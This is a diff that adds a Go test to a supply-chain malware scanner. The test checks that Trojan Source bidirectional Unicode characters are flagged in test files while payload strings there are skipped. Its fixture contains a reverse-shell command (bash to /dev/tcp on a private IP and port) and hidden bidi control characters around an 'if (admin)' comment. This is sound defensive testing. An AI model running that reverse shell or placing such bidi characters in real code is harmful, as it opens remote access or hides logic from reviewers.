@@ -262,4 +262,23 @@ paths = [
 			t.Fatalf("expected 1 malware-shell-dropper-or-exfil finding on src/real.ts, got %+v", prodFindings)
 		}
 	})
+
+	t.Run("Trojan Source bidi runes are still caught in *_test.go while payload/exfil strings are skipped", func(t *testing.T) {
+		repo := t.TempDir()
+		if err := os.MkdirAll(filepath.Join(repo, "pkg"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		content := "package pkg\n// \u202e } \u2066if (admin)\u2069 \u2066\nconst fixture = \"bash -i >& /dev/" + "tcp/10.0.0.1/4444\"\n"
+		if err := os.WriteFile(filepath.Join(repo, "pkg", "auth_test.go"), []byte(content), 0o644); err != nil {
+			t.Fatal(err)
+		}
+
+		findings, err := supplychain.ScanRepository(repo, types.LangGo)
+		if err != nil {
+			t.Fatalf("ScanRepository error: %v", err)
+		}
+		if len(findings) != 1 || findings[0].ID != "malware-trojan-source-unicode" || findings[0].FilePath != "pkg/auth_test.go" {
+			t.Fatalf("expected exactly 1 malware-trojan-source-unicode finding on pkg/auth_test.go, got %+v", findings)
+		}
+	})
 }
